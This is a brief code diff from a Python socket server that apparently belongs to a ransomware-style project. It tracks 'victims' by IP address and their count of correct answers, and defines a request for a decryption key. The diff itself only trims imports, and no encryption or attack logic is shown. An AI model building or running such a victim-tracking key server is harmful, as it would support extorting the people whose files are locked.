@@ -1,10 +1,8 @@
 import threading
 import socket
 import os
-from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-import getpass
 import base64
 import enum
 
@@ -26,6 +24,7 @@ class Requests(enum.Enum):
     NOT_ENOUGH_CORRECT_ANSWERS = "NOT_ENOUGH_CORRECT_ANSWERS"
     REQUEST_DECRYPTION_KEY = "REQUEST_DECRYPTION_KEY"
     EXIT = "EXIT"
+
 # dictionary containing IP addresses of victims and their correct answers count
 VICTIM_CORRECT_ANSWERS_COUNTER = {}
 
